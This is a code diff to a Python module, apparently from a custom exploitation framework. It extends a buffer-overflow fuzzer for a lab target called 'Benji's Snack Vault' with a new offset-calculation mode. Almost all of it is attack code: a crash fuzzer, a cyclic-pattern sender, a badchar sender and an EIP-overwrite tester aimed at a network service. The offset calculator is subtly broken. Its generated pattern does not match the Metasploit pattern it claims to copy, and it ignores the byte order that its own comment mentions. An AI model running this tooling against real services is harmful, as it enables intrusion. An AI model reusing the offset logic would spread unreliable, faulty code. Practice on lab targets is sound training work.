@@ -10,32 +10,35 @@ class BenjisSnackVaultFuzz(BaseModule):
     def __init__(self):
         super().__init__()
         self.name = "benjis_snack_vault_fuzz"
-        self.description = "Fuzzer, pattern sender, and badchar tester for Benji's Snack Vault buffer overflow"
+        self.description = "Fuzzer, pattern sender, badchar tester, and offset calculator for Benji's Snack Vault buffer overflow"
 
         self.options = {
             "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
             "RPORT": {"value": 9999, "required": True, "description": "Target port"},
             "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix (e.g., MEOW )"},
-            "MODE": {"value": "fuzz", "required": True, "description": "Mode: fuzz | pattern | badchars | test_offset"},
-            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Pattern length for 'pattern' mode"},
-            "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (set after pattern mode)"},
+            "MODE": {"value": "fuzz", "required": True, "description": "Mode: fuzz | pattern | badchars | test_offset | offset_calc"},
+            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Length for pattern mode (auto-used in offset_calc if not set)"},
+            "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (set after pattern/offset_calc)"},
             "CRLF": {"value": True, "required": False, "description": "Append \\r\\n to payloads (yes/no)"}
         }
 
+        # Remember last pattern length for auto-use in offset_calc
+        self.last_pattern_length = 0
+
     def show_help(self):
         print(colored("\nBenji's Snack Vault Fuzzer Help:", "yellow"))
-        print("Available modes:")
-        print("  fuzz          - Send increasing A's to find crash point")
-        print("  pattern       - Send unique Metasploit pattern for offset discovery")
-        print("  badchars      - Send 01-ff byte range after offset to identify bad chars")
+        print("Modes:")
+        print("  fuzz          - Incremental A's to find crash point")
+        print("  pattern       - Send unique Metasploit-style pattern for offset discovery")
+        print("  badchars      - Send 01-ff bytes after offset to identify bad characters")
         print("  test_offset   - Test EIP overwrite with BBBB at set offset")
-        print("\nWorkflow example:")
-        print("  set MODE fuzz")
-        print("  run")
-        print("  → Note crash size → set MODE pattern → run → note EIP")
-        print("  → Run 'pattern_offset.rb -q <EIP> -l <length>' → set OFFSET <result>")
-        print("  → set MODE badchars → run → inspect stack dump in Immunity")
-        print("  → set MODE test_offset → run → confirm EIP = 42424242\n")
+        print("  offset_calc   - Calculate offset from EIP value (replaces pattern_offset.rb)")
+        print("\nTypical workflow:")
+        print("  set MODE fuzz → run → note crash size")
+        print("  set PATTERN_LENGTH <crash+500> → set MODE pattern → run → note EIP")
+        print("  set MODE offset_calc → run → enter EIP → get offset")
+        print("  set OFFSET <result> → set MODE badchars → run → inspect dump")
+        print("  set MODE test_offset → run → confirm EIP = 42424242\n")
 
     def run(self):
         opts = {k: v["value"] for k, v in self.options.items()}
@@ -43,7 +46,7 @@ class BenjisSnackVaultFuzz(BaseModule):
         rport = int(opts["RPORT"])
         prefix = opts["PREFIX"]
         mode = opts["MODE"].lower()
-        crlf = opts["CRLF"]  # bool
+        crlf = opts["CRLF"]
 
         if mode == "fuzz":
             self._run_fuzz(rhost, rport, prefix, crlf)
@@ -51,7 +54,7 @@ class BenjisSnackVaultFuzz(BaseModule):
             self._run_pattern(rhost, rport, prefix, int(opts["PATTERN_LENGTH"]), crlf)
         elif mode == "badchars":
             if opts["OFFSET"] == 0:
-                print(colored("[-] Set OFFSET first (from pattern mode)", "red"))
+                print(colored("[-] Set OFFSET first (from pattern/offset_calc mode)", "red"))
                 return
             self._run_badchars(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
         elif mode == "test_offset":
@@ -60,14 +63,10 @@ class BenjisSnackVaultFuzz(BaseModule):
                 return
             self._test_offset(rhost, rport, prefix, int(opts["OFFSET"]), crlf)
         elif mode == "offset_calc":
-            eip = input(colored("Enter EIP value (hex, e.g. 43376643): ", "yellow")).strip()
-            if not eip:
-                print(colored("[-] EIP required", "red"))
-                return
-            self._calc_offset(eip, int(opts["PATTERN_LENGTH"]))
+            self._run_offset_calc(opts)
         else:
             print(colored(f"[-] Unknown mode: {mode}", "red"))
-            print(colored("Valid modes: fuzz, pattern, badchars, test_offset", "yellow"))
+            print(colored("Valid modes: fuzz, pattern, badchars, test_offset, offset_calc", "yellow"))
 
     def _send_payload(self, rhost, rport, payload):
         try:
@@ -114,9 +113,66 @@ class BenjisSnackVaultFuzz(BaseModule):
 
         if self._send_payload(rhost, rport, payload):
             print(colored("[+] Pattern sent. Crash in Immunity → note EIP value", "green"))
-            print(colored(f"    Then run: pattern_offset.rb -q <EIP> -l {length}", "yellow"))
+            print(colored(f"    IMPORTANT: Use length {length} for offset calculation!", "red"))
+            print(colored("    Run 'set MODE offset_calc' next and enter the EIP", "yellow"))
+            # Save for auto-use
+            self.last_pattern_length = length
         else:
-            print(colored("[!] Send failed", "red"))
+            print(colored("[!] Send failed - check target", "red"))
+
+    def _run_offset_calc(self, opts):
+        pattern_length = int(opts["PATTERN_LENGTH"])
+        if pattern_length == 0 and hasattr(self, 'last_pattern_length') and self.last_pattern_length > 0:
+            pattern_length = self.last_pattern_length
+            print(colored(f"[*] Using last pattern length: {pattern_length} (from previous pattern run)", "yellow"))
+
+        if pattern_length == 0:
+            print(colored("[-] Set PATTERN_LENGTH first (or run pattern mode to auto-set)", "red"))
+            return
+
+        eip_hex = input(colored("Enter EIP value (hex, e.g. 43376643): ", "yellow")).strip()
+        if not eip_hex:
+            print(colored("[-] EIP required", "red"))
+            return
+
+        offset = self._calc_offset(eip_hex, pattern_length)
+        if offset is not None:
+            print(colored(f"[+] Use this in exploit module: set OFFSET {offset}", "green"))
+
+    def _calc_offset(self, eip_hex, pattern_length):
+        """Calculate offset from EIP value and pattern length (replaces pattern_offset.rb)"""
+        try:
+            # Convert EIP hex to bytes (little-endian)
+            eip_bytes = bytes.fromhex(eip_hex)
+            if len(eip_bytes) != 4:
+                print(colored("[-] EIP must be exactly 8 hex digits (4 bytes)", "red"))
+                return None
+
+            # Generate the same pattern Metasploit uses
+            pattern = ""
+            i = 0
+            while len(pattern) < pattern_length:
+                pattern += chr(65 + (i // 26 // 26))  # A-Z
+                pattern += chr(97 + (i // 26 % 26))   # a-z
+                pattern += str(i % 26)                # 0-9
+                i += 1
+            pattern = pattern[:pattern_length].encode()
+
+            # Find offset
+            offset = pattern.find(eip_bytes)
+            if offset == -1:
+                print(colored("[-] EIP value not found in pattern", "red"))
+                print(colored("    Possible causes:", "yellow"))
+                print(colored("    - Wrong PATTERN_LENGTH (must match the one used to send pattern)", "yellow"))
+                print(colored("    - Wrong EIP value copied", "yellow"))
+                return None
+
+            print(colored(f"[+] Exact match at offset {offset}", "green"))
+            return offset
+
+        except Exception as e:
+            print(colored(f"[-] Offset calculation failed: {e}", "red"))
+            return None
 
     def _run_badchars(self, rhost, rport, prefix, offset, crlf):
         print(colored("[*] Badchars mode - sending 01-ff after offset", "yellow"))
@@ -131,41 +187,9 @@ class BenjisSnackVaultFuzz(BaseModule):
             print(colored("[+] Badchars sent. In Immunity:", "green"))
             print("    1. Crash → right-click ESP → Follow in Dump")
             print("    2. Look for mangled/missing/replaced bytes after BBBB")
+            print("    3. Common bad: \\x00 \\x09 \\x0a \\x0d")
         else:
             print(colored("[!] Send failed", "red"))
-
-    def _calc_offset(self, eip_hex, pattern_length):
-        """Calculate offset from EIP value and pattern length (replaces pattern_offset.rb)"""
-        try:
-            # Convert EIP hex to bytes (little-endian, as it appears on stack)
-            eip_bytes = bytes.fromhex(eip_hex)
-            if len(eip_bytes) != 4:
-                print(colored("[-] EIP must be exactly 4 bytes (8 hex digits)", "red"))
-                return None
-
-            # Generate the same pattern Metasploit uses (Aa0Aa1Aa2...)
-            pattern = ""
-            i = 0
-            while len(pattern) < pattern_length:
-                pattern += chr(65 + (i // 26 // 26))  # Uppercase A-Z
-                pattern += chr(97 + (i // 26 % 26))   # lowercase a-z
-                pattern += str(i % 26)                # 0-9
-                i += 1
-            pattern = pattern[:pattern_length].encode()  # to bytes
-
-            # Find the offset where eip_bytes appears
-            offset = pattern.find(eip_bytes)
-            if offset == -1:
-                print(colored("[-] EIP value not found in pattern", "red"))
-                return None
-
-            print(colored(f"[+] Exact match at offset {offset}", "green"))
-            print(colored(f"    Use this in exploit module: set OFFSET {offset}", "yellow"))
-            return offset
-
-        except Exception as e:
-            print(colored(f"[-] Offset calculation failed: {e}", "red"))
-            return None
 
     def _test_offset(self, rhost, rport, prefix, offset, crlf):
         print(colored(f"[*] Testing offset {offset} with BBBB", "yellow"))
